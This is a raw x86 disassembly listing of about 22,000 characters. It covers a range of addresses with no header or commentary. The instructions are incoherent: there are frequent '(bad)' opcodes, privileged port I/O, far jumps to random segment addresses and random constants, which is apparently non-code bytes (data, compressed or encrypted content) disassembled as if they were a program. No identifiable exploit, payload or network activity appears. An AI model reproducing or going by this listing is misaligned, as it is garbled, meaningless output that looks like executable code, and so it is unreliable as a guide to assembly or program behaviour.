  41dacb:	test   al,0x50
  41dacd:	(bad)  
  41dace:	fabs   
  41dad0:	test   al,0xc9
  41dad2:	xchg   BYTE PTR [edx+0xdd56532],dl
  41dad8:	push   edi
  41dad9:	cmp    al,0x38
  41dadb:	add    esp,DWORD PTR [ebp+0x13]
  41dade:	out    0xc3,al
  41dae0:	ror    edx,0xb6
  41dae3:	mov    ds:0xbce5ed31,eax
  41dae8:	pusha  
  41dae9:	sar    BYTE PTR [edx],0x95
  41daec:	adc    DWORD PTR [ebp-0x626cbdac],ebp
  41daf2:	(bad)  
  41daf3:	sbb    bl,cl
  41daf5:	adc    BYTE PTR [edx+edx*1],ch
  41daf8:	in     al,0xf6
  41dafa:	mov    dh,0xee
  41dafc:	cli    
  41dafd:	sbb    eax,0x468170fb
  41db02:	inc    esi
  41db03:	push   esp
  41db04:	pop    es
  41db05:	out    dx,al
  41db06:	enter  0x967d,0x57
  41db0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db0b:	shl    DWORD PTR [eax+0x6952c14f],cl
  41db11:	mov    bh,0xca
  41db13:	loopne 0x41dacb
  41db15:	mov    ecx,edi
  41db17:	or     DWORD PTR [ecx-0x6f],0xffffff8a
  41db1b:	shr    ebx,cl
  41db1d:	xchg   ebp,eax
  41db1e:	xor    al,0xd1
  41db20:	or     ecx,esp
  41db22:	mov    edx,0x8dbfbcb6
  41db27:	outs   dx,BYTE PTR ds:[esi]
  41db28:	xor    edx,eax
  41db2a:	jmp    0x7d4a7d8a
  41db2f:	lods   eax,DWORD PTR ds:[esi]
  41db30:	xor    esi,DWORD PTR [edx]
  41db32:	add    cl,BYTE PTR [ebp+0x6e]
  41db35:	xchg   esi,eax
  41db36:	shl    BYTE PTR [edx-0x40],1
  41db39:	dec    edi
  41db3a:	add    eax,DWORD PTR [edi+esi*8-0x563f085]
  41db41:	xlat   BYTE PTR ds:[ebx]
  41db42:	push   edx
  41db43:	data16 or al,0x7d
  41db46:	test   DWORD PTR [esi-0x5b],ebp
  41db49:	out    dx,al
  41db4a:	(bad)  
  41db4b:	fsub   DWORD PTR [edx-0x62d157ca]
  41db51:	stc    
  41db52:	call   0x4794:0xe3e14c43
  41db59:	out    0xb3,eax
  41db5b:	enter  0x5217,0x56
  41db5f:	adc    BYTE PTR [edi],bl
  41db61:	icebp  
  41db62:	outs   dx,BYTE PTR ds:[esi]
  41db63:	jg     0x41db5f
  41db65:	dec    edi
  41db66:	mov    esp,0x702b500f
  41db6b:	into   
  41db6c:	xchg   BYTE PTR [edi+ecx*1-0x505c611],ch
  41db73:	fld    QWORD PTR [eax+0x66a4de95]
  41db79:	fldenv [edx+0x3abb67f7]
  41db7f:	sbb    DWORD PTR [edi-0x56],ebp
  41db82:	xor    DWORD PTR [esi+0x22],ecx
  41db85:	pusha  
  41db86:	fld    QWORD PTR [edi+0x66]
  41db89:	or     BYTE PTR [ebx],cl
  41db8b:	(bad)  
  41db8c:	out    0xe1,al
  41db8e:	jne    0x41db31
  41db90:	sbb    BYTE PTR [edi-0x5a038e1e],dl
  41db96:	nop
  41db97:	and    dh,BYTE PTR [eax]
  41db99:	xor    BYTE PTR [edx-0x31a51b8b],bh
  41db9f:	test   ebp,ebx
  41dba1:	(bad)  
  41dba2:	and    ebp,ebp
  41dba4:	shl    ebx,0x60
  41dba7:	out    dx,al
  41dba8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dba9:	in     al,dx
  41dbaa:	out    0x7,al
  41dbac:	push   ebp
  41dbad:	mov    ebp,0xc7d98004
  41dbb2:	mov    DWORD PTR [ebx],edx
  41dbb4:	sub    ebx,DWORD PTR [esi-0x3bf4fc8]
  41dbba:	jmp    0x41dbdb
  41dbbc:	loope  0x41db80
  41dbbe:	aad    0x65
  41dbc0:	add    DWORD PTR [edx+ebx*1],0x34
  41dbc4:	or     DWORD PTR [eax-0x7],edi
  41dbc7:	rcl    esp,0xf6
  41dbca:	(bad)  
  41dbcb:	hlt    
  41dbcc:	dec    edi
  41dbcd:	or     eax,0x43fa2ad4
  41dbd2:	xor    DWORD PTR [esi],0xffffffb1
  41dbd5:	mov    eax,ds:0x6a8be14d
  41dbda:	test   dl,bh
  41dbdc:	and    al,BYTE PTR [ebp+0x3b]
  41dbdf:	sub    ecx,0x562e36d4
  41dbe5:	ds sbb edi,edi
  41dbe8:	shr    DWORD PTR [eax],1
  41dbea:	inc    edi
  41dbeb:	fwait
  41dbec:	jo     0x41dbb6
  41dbee:	and    ebp,DWORD PTR [edi+edi*1+0x37cbc2a6]
  41dbf5:	mov    eax,0x74aa476
  41dbfa:	push   es
  41dbfb:	aam    0x2d
  41dbfd:	push   ecx
  41dbfe:	xchg   ebp,eax
  41dbff:	fiadd  WORD PTR [edi+0x49435e40]
  41dc05:	aaa    
  41dc06:	dec    ebx
  41dc07:	and    bh,BYTE PTR [ebp*1+0x339ef0a7]
  41dc0e:	jnp    0x41db98
  41dc10:	mov    esi,0x88e8612d
  41dc15:	test   eax,0x997c6f7e
  41dc1a:	jns    0x41dbcc
  41dc1c:	mov    eax,ebx
  41dc1e:	xchg   ebx,eax
  41dc1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc21:	imul   esi,DWORD PTR [esi],0xe7197854
  41dc27:	pop    edi
  41dc28:	test   al,0x88
  41dc2a:	loopne 0x41dbca
  41dc2c:	jmp    0x41dc38
  41dc2e:	mov    dh,0xf7
  41dc30:	mov    edx,0x164d1e49
  41dc35:	push   edx
  41dc36:	cld    
  41dc37:	out    dx,al
  41dc38:	pop    ds
  41dc39:	shr    BYTE PTR es:[ecx],0x5b
  41dc3d:	ss stos DWORD PTR es:[edi],eax
  41dc3f:	lahf   
  41dc40:	popf   
  41dc41:	mov    ecx,0x1679b8ed
  41dc46:	addr16 mov cl,0x79
  41dc49:	leave  
  41dc4a:	div    DWORD PTR [ecx]
  41dc4c:	mov    ds:0x265d8587,eax
  41dc51:	push   es
  41dc52:	aaa    
  41dc53:	je     0x41dcc5
  41dc55:	ins    DWORD PTR es:[edi],dx
  41dc56:	je     0x41dc2c
  41dc58:	sahf   
  41dc59:	pop    eax
  41dc5a:	sbb    dl,BYTE PTR [ebx-0x2]
  41dc5d:	mov    ?,WORD PTR [ecx+0x24ea7b6e]
  41dc63:	jmp    0xf71:0xe51385d0
  41dc6a:	pop    ss
  41dc6b:	xor    eax,0x66adcbcf
  41dc70:	and    dl,BYTE PTR ds:0xe891092b
  41dc76:	(bad)  
  41dc77:	mov    al,0x7d
  41dc79:	test   DWORD PTR [edi+0xc7e5d0],ebx
  41dc7f:	sbb    cl,BYTE PTR ds:0x292c3e37
  41dc85:	out    dx,eax
  41dc86:	in     al,0x6a
  41dc88:	dec    edx
  41dc89:	inc    edx
  41dc8a:	aaa    
  41dc8b:	sti    
  41dc8c:	mov    ds:0xb375a1d3,eax
  41dc91:	mov    DWORD PTR [eax],ecx
  41dc93:	fild   WORD PTR [edi]
  41dc95:	or     eax,0xe9b283b
  41dc9a:	mov    ecx,ds
  41dc9c:	cmp    ebx,ebx
  41dc9e:	and    esi,esi
  41dca0:	mov    ds:0x391f5b97,al
  41dca5:	push   cs
  41dca6:	inc    esi
  41dca7:	jnp    0x41dc34
  41dca9:	fnstenv [eax+0x8]
  41dcac:	fisub  DWORD PTR [ebx+edx*8+0x22]
  41dcb0:	in     al,0x20
  41dcb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dcb3:	sti    
  41dcb4:	dec    edi
  41dcb6:	mov    ds:0x42908e4d,eax
  41dcbb:	cmp    dl,BYTE PTR [eax+0x46]
  41dcbe:	sbb    dl,BYTE PTR [eax-0x55b80843]
  41dcc4:	mov    WORD PTR [edi],?
  41dcc6:	lods   al,BYTE PTR ds:[esi]
  41dcc7:	xchg   esi,eax
  41dcc8:	inc    esi
  41dcc9:	add    ch,BYTE PTR [edx]
  41dccb:	lock or DWORD PTR [edx-0x73],eax
  41dccf:	fsub   DWORD PTR fs:[eax-0xe]
  41dcd3:	sar    DWORD PTR [ebp-0x486f2fc6],0xf1
  41dcda:	jae    0x41dd1f
  41dcdc:	rcl    BYTE PTR ds:0x9a5bcce9,1
  41dce2:	xor    esi,DWORD PTR [ecx+0x9bd9966]
  41dce8:	out    dx,al
  41dce9:	(bad)  
  41dcea:	dec    esi
  41dceb:	mov    BYTE PTR [ecx],0xa
  41dcee:	xlat   BYTE PTR ds:[ebx]
  41dcef:	jnp    0x41dd55
  41dcf1:	lea    esi,[edi]
  41dcf3:	lods   eax,DWORD PTR ds:[esi]
  41dcf4:	sbb    ah,BYTE PTR ds:0xfed29588
  41dcfa:	retf   0xcc55
  41dcfd:	or     edi,DWORD PTR [ebx+0x3209a241]
  41dd03:	aam    0xf3
  41dd05:	cmp    esi,DWORD PTR [ecx+ebp*2+0x31]
  41dd09:	fdivr  QWORD PTR [eax-0x2c]
  41dd0c:	test   BYTE PTR ds:0xf5e1436e,dh
  41dd12:	pop    ecx
  41dd13:	(bad)  
  41dd14:	adc    al,0xc1
  41dd16:	fwait
  41dd17:	popf   
  41dd18:	adc    eax,0x3b0b4837
  41dd1d:	in     eax,0x24
  41dd1f:	call   0x474479a5
  41dd24:	inc    esi
  41dd25:	mov    cl,0xff
  41dd27:	dec    edx
  41dd28:	call   0x10610bf8
  41dd2d:	push   eax
  41dd2e:	push   es
  41dd2f:	call   FWORD PTR [edx+0x23d95a0f]
  41dd35:	pop    es
  41dd36:	iret   
  41dd37:	xlat   BYTE PTR ds:[ebx]
  41dd38:	adc    DWORD PTR [ecx+0x68],ebp
  41dd3b:	push   ebx
  41dd3c:	sbb    edx,DWORD PTR [edx+0x2b153d6c]
  41dd42:	enter  0x5899,0x8e
  41dd46:	add    eax,0x963d62cf
  41dd4b:	sbb    bl,dh
  41dd4d:	fs mov dl,0x5d
  41dd50:	mov    ebx,0x34dfb63d
  41dd55:	lea    edi,[ebx+0x76be8f52]
  41dd5b:	cmp    ebp,DWORD PTR cs:0x534a7d1a
  41dd62:	and    BYTE PTR [edx],dl
  41dd64:	shl    BYTE PTR [ecx-0x4b],cl
  41dd67:	or     ah,dh
  41dd69:	fcomp  DWORD PTR [edi+0x71]
  41dd6c:	lods   al,BYTE PTR ds:[esi]
  41dd6d:	pusha  
  41dd6e:	int3   
  41dd6f:	mov    bl,0xb8
  41dd71:	mov    esi,0x948ab4e9
  41dd76:	jg     0x41dd05
  41dd78:	pop    esi
  41dd79:	add    BYTE PTR [ebp+0x6a],dl
  41dd7c:	cmp    DWORD PTR [ebx+ecx*1+0x1c5e1853],0x7f
  41dd84:	gs ret 
  41dd86:	mov    DWORD PTR [edx+0x24],ebx
  41dd89:	(bad)  [edx]
  41dd8b:	(bad)  
  41dd8d:	cmp    esp,DWORD PTR [eax]
  41dd8f:	je     0xe571ef94
  41dd95:	aam    0x89
  41dd97:	repnz xor esp,ebp
  41dd9a:	aaa    
  41dd9b:	mov    esp,0xb75c0c30
  41dda0:	cli    
  41dda1:	sub    DWORD PTR [ebx+0xf59f3a],0x741b1393
  41ddab:	aad    0x9b
  41ddad:	cdq    
  41ddae:	adc    esi,DWORD PTR [edx+0x26e56478]
  41ddb4:	mov    ebx,0xa82aad8b
  41ddb9:	adc    ebp,DWORD PTR [esi+edx*8-0x6b55c999]
  41ddc0:	or     ch,BYTE PTR [ecx+esi*4]
  41ddc3:	pop    edi
  41ddc4:	jg     0x41dd69
  41ddc6:	out    dx,eax
  41ddc7:	rcr    DWORD PTR [ecx],cl
  41ddc9:	loopne 0x41dd91
  41ddcb:	mov    eax,0x18482a28
  41ddd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ddd1:	shr    bl,cl
  41ddd3:	fdiv   st,st(0)
  41ddd5:	rcl    DWORD PTR ds:0x3e64cf6d,cl
  41dddb:	cmp    al,0x99
  41dddd:	rcl    BYTE PTR [ecx+0x1],0x3c
  41dde1:	test   al,0xbf
  41dde3:	rol    BYTE PTR [edx-0x3f],1
  41dde6:	loope  0x41de2e
  41dde8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dde9:	(bad)  
  41ddea:	fcom   DWORD PTR [ebp-0x44c8a80]
  41ddf0:	jmp    0x62f4:0xc5f103d9
  41ddf7:	ret    
  41ddf8:	test   DWORD PTR [eax],eax
  41ddfa:	and    al,0xbf
  41ddfc:	xchg   edi,eax
  41ddfd:	loopne 0x41ddd2
  41ddff:	in     al,0x9a
  41de01:	sti    
  41de02:	push   es
  41de03:	mov    ah,0x16
  41de05:	js     0x41dd9e
  41de07:	sub    ecx,DWORD PTR [esi+0x7f9d27a8]
  41de0d:	adc    al,0x6
  41de0f:	jae    0x41de2b
  41de11:	popf   
  41de12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de13:	push   ebp
  41de14:	or     esi,DWORD PTR [edi+0x1b59f1b3]
  41de1a:	dec    ebx
  41de1b:	pop    es
  41de1c:	xor    eax,0xc3e95630
  41de21:	push   0xffffffe7
  41de23:	inc    ecx
  41de24:	jo     0x41ddb0
  41de26:	pop    edi
  41de27:	or     al,0xb6
  41de29:	dec    edi
  41de2a:	loopne 0x41de69
  41de2c:	lds    ecx,FWORD PTR [ebp+edx*8-0x7c]
  41de30:	mov    bl,0xa4
  41de32:	mov    esi,0x61ac081
  41de37:	mov    ecx,0x383183c8
  41de3c:	sti    
  41de3d:	popa   
  41de3e:	les    eax,FWORD PTR [ebp-0x21]
  41de41:	mov    ch,0x1f
  41de43:	cmp    ah,BYTE PTR [esp+ecx*2-0x62]
  41de47:	sub    eax,0xf13f24c1
  41de4c:	ret    0x28b4
  41de4f:	stos   DWORD PTR es:[edi],eax
  41de50:	push   ds
  41de51:	or     BYTE PTR [ebx+0x7d],ah
  41de54:	aas    
  41de55:	mov    al,ds:0x69d49831
  41de5a:	outs   dx,DWORD PTR ds:[esi]
  41de5b:	jbe    0x41dde6
  41de5d:	lds    esi,FWORD PTR [esi-0x1fc905c1]
  41de63:	mov    edx,0x1ade93e7
  41de68:	jae    0x41dee5
  41de6a:	cmp    ebp,DWORD PTR [eax+edi*4-0x6513a7f0]
  41de71:	dec    ecx
  41de72:	dec    eax
  41de73:	mov    fs,esi
  41de75:	fldcw  WORD PTR [edi+0x516f66ad]
  41de7b:	(bad)  [esi]
  41de7d:	aam    0xcb
  41de7f:	retf   0x3592
  41de82:	mov    bh,0xb
  41de84:	imul   eax,DWORD PTR [edx+0x47],0xffffffd2
  41de88:	xchg   esp,eax
  41de89:	xor    cl,BYTE PTR [esi-0x13]
  41de8c:	jno    0x41de77
  41de8e:	arpl   WORD PTR [edi],di
  41de90:	in     al,0x72
  41de92:	int3   
  41de93:	inc    eax
  41de94:	into   
  41de95:	inc    esp
  41de96:	dec    esi
  41de97:	loopne 0x41de78
  41de99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de9a:	cmp    cl,BYTE PTR [esp+ecx*8]
  41de9d:	jno    0x41ded3
  41de9f:	cdq    
  41dea0:	cli    
  41dea1:	imul   esi,DWORD PTR [edi+0x7b49077c],0xffffffbc
  41dea8:	jmp    DWORD PTR [edi-0x3c]
  41deab:	call   0x99dd:0x2072412
  41deb2:	std    
  41deb3:	(bad)  
  41deb4:	out    dx,eax
  41deb5:	push   0xffffffe5
  41deb7:	push   edi
  41deb8:	push   edx
  41deb9:	mov    edi,0x6815969
  41debe:	mov    WORD PTR [ecx+0x2314f470],ds
  41dec4:	adc    eax,0xc3dacc39
  41dec9:	sbb    eax,0xa5f88819
  41dece:	fild   QWORD PTR [ebp+0x3b3936fa]
  41ded4:	xchg   ecx,eax
  41ded5:	xor    eax,0x72f7628
  41deda:	mov    dl,0x78
  41dedc:	icebp  
  41dedd:	rol    DWORD PTR [ebx-0x39],cl
  41dee0:	jg     0x41df0c
  41dee2:	add    ebp,ebp
  41dee4:	jle    0x41deff
  41dee6:	dec    ecx
  41dee7:	adc    al,0x9a
  41dee9:	adc    ch,BYTE PTR [esp+edx*4]
  41deec:	mov    dh,0x6b
  41deee:	pop    ss
  41deef:	and    dl,BYTE PTR [edi-0x23]
  41def2:	inc    ebx
  41def3:	ss out 0x56,eax
  41def6:	adc    BYTE PTR [edi+0x46],bh
  41def9:	mov    ds:0xf8af9f34,al
  41defe:	xor    al,0x85
  41df00:	inc    ebx
  41df01:	xchg   DWORD PTR [eax-0x279a49c1],edx
  41df07:	lods   eax,DWORD PTR ds:[esi]
  41df08:	and    eax,0xe4057f03
  41df0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df0e:	push   esi
  41df0f:	push   0x1609adb9
  41df14:	aaa    
  41df15:	repnz das 
  41df17:	mov    cl,0xce
  41df19:	dec    edx
  41df1a:	imul   edx,DWORD PTR [eax+0x2b],0x67
  41df1e:	or     eax,0xe2cc64c2
  41df23:	mov    ds:0xc22ed303,eax
  41df28:	xchg   ecx,eax
  41df29:	lods   al,BYTE PTR ds:[esi]
  41df2a:	and    dl,BYTE PTR [ebx]
  41df2c:	stos   DWORD PTR es:[edi],eax
  41df2d:	jp     0x41df4c
  41df2f:	std    
  41df30:	xor    esp,DWORD PTR [esi-0x2cfb57ac]
  41df36:	loopne 0x41dfad
  41df38:	les    ebp,FWORD PTR [esi+0x1459883f]
  41df3e:	xor    eax,0xdb8aa7ee
  41df43:	ficomp WORD PTR [edi+0x1b]
  41df46:	mov    ch,0x83
  41df48:	and    DWORD PTR [ecx],ebp
  41df4a:	cdq    
  41df4b:	inc    esi
  41df4c:	jb     0x41df4c
  41df4e:	jae    0x41defb
  41df50:	leave  
  41df51:	ret    
  41df52:	sbb    al,0x9b
  41df54:	jo     0x41dfc5
  41df56:	dec    edi
  41df57:	stos   BYTE PTR es:[edi],al
  41df58:	pop    ds
  41df59:	xor    al,0x5
  41df5b:	xor    DWORD PTR [ebp-0x7f],edi
  41df5e:	ss adc al,0xc0
  41df61:	outs   dx,DWORD PTR ds:[esi]
  41df62:	add    BYTE PTR [edi-0x3a],0x97
  41df66:	fdiv   DWORD PTR [ecx]
  41df68:	mov    bh,0x8e
  41df6a:	pushw  ds
  41df6c:	pushf  
  41df6d:	pop    esi
  41df6e:	lds    edx,FWORD PTR [ebx+0x12]
  41df71:	mov    esp,0xc58915b
  41df76:	fild   DWORD PTR [eax]
  41df78:	mov    esi,ds
  41df7a:	cmc    
  41df7b:	jecxz  0x41dff1
  41df7d:	mov    edx,0x8036367b
  41df82:	es pushf 
  41df84:	test   DWORD PTR [ecx],ebp
  41df86:	and    al,0x2a
  41df88:	jmp    ebp
  41df8a:	pop    ebp
  41df8b:	das    
  41df8c:	mov    ch,BYTE PTR ds:0x4902bc95
  41df92:	sub    al,0x2e
  41df94:	shl    DWORD PTR [eax+esi*8-0x10b3a26c],1
  41df9b:	mov    ecx,0x4e7e2802
  41dfa0:	adc    bh,bl
  41dfa2:	xchg   esi,eax
  41dfa3:	lock repz adc dh,ch
  41dfa7:	in     eax,0x73
  41dfa9:	ror    DWORD PTR [eax],0xea
  41dfac:	adc    esp,edi
  41dfae:	aam    0x79
  41dfb0:	js     0x41df44
  41dfb2:	xchg   esp,eax
  41dfb3:	jge    0x41e002
  41dfb5:	or     DWORD PTR [ebx+0x1e40ff0],ebp
  41dfbb:	(bad)  
  41dfbd:	ffree  st(0)
  41dfbf:	popf   
  41dfc0:	xchg   esp,eax
  41dfc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dfc2:	mov    dl,BYTE PTR [edx]
  41dfc4:	jmp    0x42c:0x1d914178
  41dfcb:	call   0xed7:0x3f6106e
  41dfd2:	or     bh,BYTE PTR [ebp-0x3a3da066]
  41dfd8:	outs   dx,DWORD PTR ds:[esi]
  41dfd9:	adc    BYTE PTR [eax+0x67],dl
  41dfdc:	sbb    DWORD PTR ds:0xe1480b8c,edx
  41dfe2:	call   0x5d38:0x7e8a7d8
  41dfe9:	gs sti 
  41dfeb:	add    dl,BYTE PTR [esi]
  41dfed:	xchg   ebx,eax
  41dfee:	ret    0x4dcc
  41dff1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dff2:	sar    BYTE PTR [eax],0x6a
  41dff5:	aam    0x7f
  41dff7:	call   0xd6d4:0x3a918ec8
  41dffe:	mov    edi,0xd3f8c15f
  41e003:	rcl    BYTE PTR [eax+0x5e],0xa2
  41e007:	repnz mov bl,0x5d
  41e00a:	or     al,0x6
  41e00c:	or     eax,0xef55a08c
  41e011:	loopne 0x41dfe4
  41e013:	mov    ebp,fs
  41e015:	fld    DWORD PTR [esi-0xa]
  41e018:	pusha  
  41e019:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e01a:	jo     0x41e017
  41e01c:	lods   eax,DWORD PTR ds:[esi]
  41e01d:	adc    esp,DWORD PTR [eax]
  41e01f:	sti    
  41e020:	push   cs
  41e021:	push   es
  41e022:	push   eax
  41e023:	in     eax,dx
  41e024:	ficom  DWORD PTR [eax]
  41e026:	addr16 daa 
  41e028:	(bad)  
  41e02a:	jb     0x41e054
  41e02c:	inc    ebp
  41e02d:	push   ds
  41e02e:	retf   
  41e02f:	jbe    0x41e034
  41e031:	mov    al,0xd7
  41e033:	cmp    DWORD PTR [ecx],ebx
  41e035:	mov    bh,0x2c
  41e037:	sahf   
  41e038:	and    BYTE PTR [edx],cl
  41e03a:	mov    edx,0x847dd7c9
  41e03f:	xor    edx,DWORD PTR [ecx+0x67c5f0ba]
  41e045:	inc    edx
  41e046:	sbb    BYTE PTR [ebx],ch
  41e048:	out    dx,eax
  41e049:	inc    edi
  41e04a:	jge    0x41e05f
  41e04c:	and    DWORD PTR [eax],ebx
  41e04e:	inc    edx
  41e04f:	jle    0x41e0b5
  41e051:	rcr    DWORD PTR [edx],0x72
  41e054:	addr16 jns 0x41dfe7
  41e057:	pop    ecx
  41e058:	pop    edx
  41e059:	popa   
  41e05a:	outs   dx,BYTE PTR ds:[esi]
  41e05b:	xchg   ebx,eax
  41e05c:	and    DWORD PTR [ecx-0x67],0x21c73dc
  41e063:	and    eax,esp
  41e065:	inc    edi
  41e066:	iret   
  41e067:	push   eax
  41e068:	sar    BYTE PTR [edx+0x1c],0xb6
  41e06c:	inc    edi
  41e06d:	jno    0x41e0dd
  41e06f:	push   ebp
  41e070:	test   BYTE PTR [edx+0x241c5419],ch
  41e076:	push   ebx
  41e077:	fcomip st,st(4)
  41e079:	daa    
  41e07a:	pop    esi
  41e07b:	ret    0xa044
  41e07e:	pop    edi
  41e07f:	dec    ebx
  41e080:	jnp    0x41e091
  41e082:	fdivr  QWORD PTR [esi-0x4c6de5b5]
  41e088:	daa    
  41e089:	fiadd  WORD PTR [edi-0x6d]
  41e08c:	hlt    
  41e08d:	mov    al,0xde
  41e08f:	ss iret 
  41e091:	lods   eax,DWORD PTR ds:[esi]
  41e092:	hlt    
  41e093:	adc    DWORD PTR [esi-0x2a631def],ebx
  41e099:	lea    edi,[edx]
  41e09b:	into   
  41e09c:	sbb    BYTE PTR [ecx],al
  41e09e:	std    
  41e09f:	push   ebx
  41e0a0:	pop    edi
  41e0a1:	cwde   
  41e0a2:	loop   0x41e10b
  41e0a4:	mov    ch,0x14
  41e0a6:	fild   WORD PTR [eax-0x1b]
  41e0a9:	jne    0x41e07c
  41e0ab:	data16 test BYTE PTR [ebp+0x34],bh
  41e0af:	xor    BYTE PTR ds:0xfa14b1b7,0xa3
  41e0b6:	mov    WORD PTR [ecx+0x749f0e32],?
  41e0bc:	cld    
  41e0bd:	xlat   BYTE PTR ds:[ebx]
  41e0be:	mov    BYTE PTR [ebp+0x463f7f2f],cl
  41e0c4:	jmp    0x41e0da
  41e0c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e0c7:	imul   esp,ecx,0xdc92ed61
  41e0cd:	sub    edi,DWORD PTR [eax-0x3e]
  41e0d0:	leave  
  41e0d1:	pop    eax
  41e0d2:	cmp    al,0x30
  41e0d4:	inc    esp
  41e0d5:	xchg   ecx,eax
  41e0d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e0d7:	adc    DWORD PTR [ebx+0x65],eax
  41e0da:	inc    edi
  41e0db:	jmp    0xa4c8:0x3b18b5ef
  41e0e2:	fwait
  41e0e3:	pushf  
  41e0e4:	pop    esi
  41e0e5:	and    BYTE PTR [eax],dl
  41e0e7:	inc    DWORD PTR [eax+0x2dfe585a]
  41e0ed:	sbb    esi,ecx
  41e0ef:	outs   dx,DWORD PTR ds:[esi]
  41e0f0:	out    0xa7,al
  41e0f2:	ins    DWORD PTR es:[edi],dx
  41e0f3:	test   al,0xaf
  41e0f5:	mov    edi,0xf559b2ef
  41e0fa:	ficom  DWORD PTR [ecx+eax*1-0x64]
  41e0fe:	imul   edx,DWORD PTR [ecx+ecx*2-0x3080647d],0x189557b9
  41e109:	add    BYTE PTR [esi-0x45],bh
  41e10c:	arpl   WORD PTR [ecx-0x4b],ax
  41e10f:	ja     0x41e09a
  41e111:	outs   dx,BYTE PTR ds:[esi]
  41e112:	scas   al,BYTE PTR es:[edi]
  41e113:	push   esi
  41e114:	sbb    ebx,DWORD PTR [ebx+0x7880aeae]
  41e11a:	daa    
  41e11b:	and    DWORD PTR [eax-0x62],esp
  41e11e:	rol    BYTE PTR [esi],cl
  41e120:	sahf   
  41e121:	inc    ebp
  41e122:	icebp  
  41e123:	aas    
  41e124:	shl    ecx,cl
  41e126:	push   es
  41e127:	push   esi
  41e128:	pop    DWORD PTR [edi-0x76]
  41e12b:	out    0x68,al
  41e12d:	and    bl,al
  41e12f:	loopne 0x41e0b7
  41e131:	retf   0x7c74
  41e134:	sti    
  41e135:	add    BYTE PTR [ecx-0x3f],cl
  41e138:	test   BYTE PTR [esi],cl
  41e13a:	adc    edi,0xffffff87
  41e13d:	mov    ecx,0x8e5f95f1
  41e142:	int3   
  41e143:	dec    edx
  41e144:	jnp    0x41e14d
  41e146:	fs out dx,al
  41e148:	cs jo  0x41e1c1
  41e14b:	sub    esp,DWORD PTR [esi+0x3e0ef388]
  41e151:	inc    eax
  41e152:	inc    edi
  41e153:	cli    
  41e154:	xchg   edx,eax
  41e155:	or     BYTE PTR [ecx-0x3a],bl
  41e158:	ja     0x41e123
  41e15a:	dec    esi
  41e15b:	int3   
  41e15c:	shl    DWORD PTR [esi],cl
  41e15e:	fwait
  41e15f:	pushf  
  41e160:	mov    esi,0x729dfa7b
  41e165:	and    esp,esp
  41e167:	jge    0x41e15a
  41e169:	call   0x54457db0
  41e16e:	mov    fs,WORD PTR [edx]
  41e170:	in     al,dx
  41e171:	or     ah,ah
  41e173:	dec    esi
  41e174:	and    ch,BYTE PTR [ebp-0x36]
  41e177:	add    dh,bl
  41e179:	and    eax,0x5d6565c4
  41e17e:	test   DWORD PTR [edx+0x4c],esi
  41e181:	add    al,0x4e
  41e183:	test   eax,0x1cde340
  41e188:	pop    ecx
  41e189:	cmp    DWORD PTR [ebx-0x13],esi
  41e18c:	push   es
  41e18d:	xchg   esp,eax
  41e18e:	les    ebx,FWORD PTR [esi-0x24ec94c0]
  41e194:	js     0x41e1bd
  41e196:	xchg   DWORD PTR [ecx+0x59],esi
  41e199:	and    dl,dh
  41e19b:	or     al,0x4b
  41e19d:	cmp    bl,cl
  41e19f:	scas   al,BYTE PTR es:[edi]
  41e1a0:	or     al,0x22
  41e1a2:	je     0x41e1a8
  41e1a4:	mov    edi,0x65dd65a5
  41e1a9:	adc    edi,eax
  41e1ab:	rol    BYTE PTR [ebp+0x30],1
  41e1ae:	pusha  
  41e1af:	inc    edx
  41e1b0:	repnz (bad) 
  41e1b2:	rol    ebp,1
  41e1b4:	iret   
  41e1b5:	je     0x41e1d4
  41e1b7:	cmp    dh,BYTE PTR [ebp+0x4a]
  41e1ba:	lahf   
  41e1bb:	shl    DWORD PTR [esi],1
  41e1bd:	add    eax,0x3b5971e9
  41e1c2:	mov    edx,0x44cfbaf3
  41e1c7:	inc    edx
  41e1c8:	loop   0x41e1ac
  41e1ca:	psrlq  mm3,QWORD PTR [ebp+0x629eaafe]
  41e1d1:	push   0xef3b9bdc
  41e1d6:	int3   
  41e1d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e1d8:	pop    ecx
  41e1d9:	dec    edi
  41e1da:	add    edi,ecx
  41e1dc:	xchg   esi,eax
  41e1dd:	mov    ch,0x28
  41e1df:	and    bl,ah
  41e1e1:	mov    al,0x1b
  41e1e3:	icebp  
  41e1e4:	sub    al,0xe1
  41e1e6:	mov    ecx,DWORD PTR [ecx]
  41e1e8:	fsub   st,st(5)
  41e1ea:	xor    ecx,DWORD PTR [ebx+0x5b2dcdc6]
  41e1f0:	fwait
  41e1f1:	in     eax,0xd5
  41e1f3:	adc    DWORD PTR [ebx+esi*1],edi
  41e1f6:	out    dx,eax
  41e1f7:	mov    esi,DWORD PTR [ebx-0x7fa3305c]
  41e1fd:	pop    ebx
  41e1fe:	push   0x1a
  41e200:	mov    ah,0x33
  41e202:	test   BYTE PTR [edx*2+0x3b0c8ca7],dl
  41e209:	dec    eax
  41e20a:	sub    al,0xf5
  41e20c:	in     eax,0x95
  41e20e:	and    BYTE PTR [edx+0x59],bh
  41e211:	daa    
  41e212:	add    eax,0x5a56ed4a
  41e217:	jl     0x41e1d6
  41e219:	bound  edi,QWORD PTR [ebx]
  41e21b:	lods   eax,DWORD PTR ds:[esi]
  41e21c:	xlat   BYTE PTR ds:[ebx]
  41e21d:	shr    BYTE PTR ds:0xe0dc498a,1
  41e223:	xchg   BYTE PTR ds:0x8dd354f0,cl
  41e229:	pop    edx
  41e22a:	repz (bad) 
